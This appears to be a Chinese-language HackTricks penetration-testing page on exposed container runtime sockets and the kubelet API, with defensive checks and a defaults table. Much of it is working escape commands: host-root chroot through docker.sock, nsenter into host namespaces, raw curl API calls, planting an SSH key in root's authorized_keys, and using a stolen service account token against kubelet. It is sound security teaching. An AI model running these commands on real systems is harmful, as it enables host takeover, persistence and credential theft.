# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的容器失陷并非始于 namespace escape，而是始于对 runtime control plane 的访问。如果工作负载能通过挂载的 Unix socket 或暴露的 TCP listener 与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者就可能请求创建权限更高的新容器、挂载主机文件系统、加入主机 namespace，或获取敏感的节点信息。在这些情况下，runtime API 才是真正的安全边界；攻陷它在实际效果上几乎等同于攻陷主机。

因此，runtime socket 暴露应与内核保护措施分开记录。即使容器使用了常规 seccomp、capabilities 和 MAC 隔离，只要其中挂载了 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock`，攻击者仍可能只需一次 API 调用就攻陷主机。当前容器的内核隔离可能完全按设计正常工作，但 runtime 管理平面仍可能完全暴露。

## Daemon 访问模式

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其特权 API。过去，它也曾通过 TCP listener 远程暴露，例如 `tcp://0.0.0.0:2375`，或通过受 TLS 保护的 `2376` listener 暴露。在没有强 TLS 和客户端身份验证的情况下远程暴露 daemon，实际上就等于把 Docker API 变成远程 root 接口。

containerd、CRI-O、Podman 和 kubelet 也暴露类似的高影响攻击面。它们的名称和工作流各不相同，但原理不变。如果某个接口允许调用者创建工作负载、挂载主机路径、获取凭据或修改正在运行的容器，那么该接口就是特权管理通道，应据此对待。

容器管理 Web UI 也可能暴露同一安全边界，即使它没有向本地账户直接提供 socket 访问权限。例如，[Portainer issue #493](https://github.com/portainer/portainer/issues/493) 记录了一个旧版 1.11.1 构建中无需身份验证即可重置管理员密码的问题。仅将本地可访问的 UI 视为审查线索：确认已安装的构建版本及其身份验证行为、是否实际拥有管理员控制权，以及它所管理的 endpoint 是否能通过可写的主机 bind mount 创建容器。[Portainer 文档](https://docs.portainer.io/admin/environments/add/docker/socket)说明，基于 socket 的管理需要访问 Docker socket；rootless 或受限的 endpoint 会改变对主机的影响。不要仅凭进程名、端口或版本字符串，就推断存在身份验证漏洞或可获取主机 root 权限。

值得检查的常见本地路径包括：

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

较旧或更专用的栈也可能暴露 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 等端点。这些端点在现代环境中较少见，但遇到时也应同样谨慎对待，因为它们代表的是 runtime 控制接口，而不是普通的应用套接字。

## 安全远程访问

如果必须通过本地套接字以外的方式暴露守护进程，应使用 TLS 保护连接，并且最好采用双向身份验证，让守护进程验证客户端，同时让客户端验证守护进程。过去为了方便而通过纯 HTTP 开放 Docker 守护进程的做法，是容器管理中最危险的错误之一，因为其 API 接口足以直接创建特权容器。

历史上的 Docker 配置模式如下：

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

在基于 systemd 的主机上，daemon 通信也可能使用 `fd://`，这表示进程继承了 systemd 预先打开的 socket，而不是自行直接绑定 socket。重要的教训不在于具体语法，而在于其安全后果。一旦 daemon 的监听范围超出权限严格限制的本地 socket，传输安全和客户端身份验证就不再是可选的加固措施，而是必需的。

## 滥用

如果存在 runtime socket，请确认它是哪一种、是否有兼容的客户端，以及能否进行原始 HTTP 或 gRPC 访问：

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

这些命令很有用，因为它们可以区分路径失效、socket 已挂载但无法访问，以及可用的特权 API。如果客户端调用成功，接下来要确认的是：API 是否能通过 host bind mount 或共享 host namespace 来启动新容器。

### 未安装客户端时

没有安装 `docker`、`podman` 或其他易用的 CLI，并不意味着 socket 是安全的。Docker Engine 通过 Unix socket 使用 HTTP 通信，而 Podman 通过 `podman system service` 同时提供与 Docker 兼容的 API 和 Libpod 原生 API。这意味着，即使是只安装了 `curl` 的精简环境，也可能足以驱动 daemon：

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

对于受 `open_basedir` 限制的 PHP 代码执行，如果 PHP 进程具有连接权限，[Unix socket connections remain a separate route](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir)。

这在 post-exploitation 阶段很重要，因为防御者有时会移除常用的客户端二进制文件，却保留挂载的管理 socket。在 Podman 主机上，请记住，高价值路径因 rootful 和 rootless 部署而异：rootful 服务实例使用 `unix:///run/podman/podman.sock`，rootless 实例使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### 完整示例：通过 Docker Socket 获取 Host Root

如果可以访问 `docker.sock`，经典的逃逸方式是启动一个挂载主机根文件系统的新容器，然后 `chroot` 进入其中：

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

这会通过 Docker daemon 直接以主机 root 权限执行操作。影响不仅限于读取文件。进入新容器后，攻击者可以修改主机文件、窃取凭据、植入持久化机制，或启动其他特权工作负载。

### 完整示例：通过 Docker Socket 进入主机命名空间

如果攻击者更倾向于进入命名空间，而不是仅访问文件系统：

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

此路径通过要求 runtime 创建一个显式暴露 host namespace 的新 container 来触达 host，而不是利用当前 container。

### Docker Socket 持久化模式

Runtime control 也可用于持久化，而不只是获取一次性 shell。通用模式是创建一个带有 host 挂载的辅助 container，将授权访问材料或启动 hook 写入挂载的 host 文件系统，然后验证 host 是否会使用它。

示例形式：

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

同样的思路也可以针对 systemd 单元、cron 片段、应用启动文件或 SSH 密钥，具体取决于操作者想证明什么。关键在于，持久化更改是通过 runtime daemon 对主机级文件系统的操作权限完成的，而不是通过提升原始容器的权限。

### Raw Docker API Helper Pivot

如果缺少 Docker CLI，可以通过 Unix socket 上的 HTTP 来驱动相同的主机挂载 helper 流程。通用流程是：确认 API、创建带有主机 bind mount 的 helper container、启动它、创建一个 exec 实例，然后启动该 exec。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

最终的 `/exec/<id>/start` 请求依赖返回的 exec ID，但安全要点与具体的 JSON 处理方式无关：直接访问 rootful Docker daemon，就足以请求权限更高的辅助工作负载。

### 完整示例：containerd Socket

挂载的 `containerd` socket 通常同样危险：<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

如果环境中有更类似 Docker 的客户端，`nerdctl` 可能比 `ctr` 更方便，因为它提供了熟悉的 flags，例如 `--privileged`、`--pid=host` 和 `-v`：

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

影响仍然是主机失陷。即使没有 Docker 专用工具，其他 runtime API 仍可能提供相同的管理权限。在 Kubernetes 节点上，`crictl` 也可能足以用于侦察和容器交互，因为它直接与 CRI endpoint 通信。

### BuildKit 套接字

`buildkitd` 很容易被忽视，因为人们常常认为它“只是构建后端”，但该守护进程仍然是一个具有特权的控制平面。可访问的 `buildkitd.sock` 可能允许攻击者运行任意构建步骤、检查 worker 的能力、使用来自已失陷环境的本地上下文，并在守护进程配置为允许时请求危险的权限项，例如 `network.host` 或 `security.insecure`。

一些有用的初步交互方式如下：

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

如果 daemon 接受构建请求，请测试是否可用不安全的 entitlements：

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

具体影响取决于 daemon 配置，但启用了宽松 entitlements 的 rootful BuildKit 服务并非无害的开发者便利功能。应将其视为另一个高价值管理面，尤其是在 CI runners 和共享构建节点上。

### Kubelet API Over TCP

kubelet 不是容器 runtime，但它仍是节点管理面的组成部分，而且经常处于同一信任边界的讨论范围内。如果工作负载可以访问 kubelet 的安全端口 `10250`，或者节点凭据、kubeconfig 或代理权限暴露，攻击者可能无需经过 Kubernetes API server 的 admission path，就能枚举 Pods、获取日志，或在节点本地的容器中执行命令。

先从低成本的发现开始：

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

如果 kubelet 或 API-server proxy 路径授权了 `exec`，支持 WebSocket 的客户端就能借此在节点上的其他容器中执行代码。这也是为什么只有 `get` 权限的 `nodes/proxy` 比听起来更危险：请求仍可访问 kubelet 中能够执行命令的端点，而这些直接与 kubelet 的交互不会出现在常规 Kubernetes audit logs 中。<sup>[[2]](#references)</sup>

## Checks

这些检查旨在确认容器是否能够访问任何本应位于信任边界之外的管理平面。

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

这里有哪些值得关注的地方：

- 挂载的 runtime socket 通常是直接的管理操作入口，而不只是信息泄露。
- 未启用 TLS 的 `2375` TCP listener 应视为远程攻陷条件。
- `DOCKER_HOST` 等环境变量通常表明该工作负载是有意设计为与宿主机 runtime 通信的。

## Runtime 默认配置

| Runtime / 平台 | 默认状态 | 默认行为 | 常见的手动弱化配置 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix socket | `dockerd` 监听本地 socket，且 daemon 通常以 root 权限运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、在 `2376` 上使用弱 TLS 或不启用 TLS |
| Podman | 默认使用无 daemon 的 CLI | 普通本地使用无需长期运行的特权 daemon；启用 `podman system service` 后仍可能暴露 API socket | 暴露 `podman.sock`、以较宽泛的方式运行服务、以 root 权限使用 API |
| containerd | 本地特权 socket | 管理 API 通过本地 socket 暴露，通常由更高层工具使用 | 挂载 `containerd.sock`、广泛开放 `ctr` 或 `nerdctl` 访问权限、暴露特权 namespace |
| CRI-O | 本地特权 socket | CRI endpoint 面向节点本地的受信任组件 | 挂载 `crio.sock`、向不受信任的工作负载暴露 CRI endpoint |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pod 广泛访问；根据认证和授权配置，访问可能暴露 Pod 状态、凭证和执行功能 | 挂载 kubelet socket 或证书、kubelet 认证配置薄弱、使用 host networking 并能访问 kubelet endpoint |



## References

- [1] [containerd socket 利用（第 1 部分）](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server 绕过风险](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
